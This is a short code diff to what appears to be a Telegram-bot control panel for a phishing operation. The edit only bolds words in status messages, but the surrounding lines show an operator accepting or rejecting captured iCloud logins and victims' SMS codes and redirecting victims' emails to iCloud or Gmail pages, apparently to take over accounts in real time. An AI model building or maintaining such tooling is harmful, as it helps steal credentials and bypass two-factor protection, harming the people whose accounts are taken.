@@ -484,9 +484,9 @@ bot.on("callback_query", async (query) => {
       } else if (action === "page_reject") {
         statusMessage = `☁️ <code>${displayEmail}</code> iCloud Login <b>REJECTED</b>! ❌`;
       } else if (action === "sms_accept") {
-        statusMessage = `💬 <code>${smsCode}</code> SMS Accepted!✅`;
+        statusMessage = `💬 <code>${smsCode}</code> SMS <b>Accepted</b>!✅`;
       } else if (action === "sms_reject") {
-        statusMessage = `💬 <code>${smsCode}</code> SMS Rejected!❌`;
+        statusMessage = `💬 <code>${smsCode}</code> SMS <b>Rejected</b>!❌`;
       } else if (action === "redirect_icloud") {
         statusMessage = `📧 <code>${email}</code> redirected to ☁️<b>iCloud</b>☁️`;
       } else if (action === "redirect_gmail") {
@@ -859,9 +859,9 @@ if (bot2) {
         } else if (action === "page_reject") {
           statusMessage = `☁️ <code>${displayEmail}</code> iCloud Login <b>REJECTED</b>! ❌`;
         } else if (action === "sms_accept") {
-          statusMessage = `💬 <code>${smsCode}</code> SMS Accepted!✅`;
+          statusMessage = `💬 <code>${smsCode}</code> SMS <b>Accepted</b>!✅`;
         } else if (action === "sms_reject") {
-          statusMessage = `💬 <code>${smsCode}</code> SMS Rejected!❌`;
+          statusMessage = `💬 <code>${smsCode}</code> SMS <b>Rejected</b>!❌`;
         } else if (action === "redirect_icloud") {
           statusMessage = `📧 <code>${email}</code> redirected to ☁️<b>iCloud</b>☁️`;
         } else if (action === "redirect_gmail") {
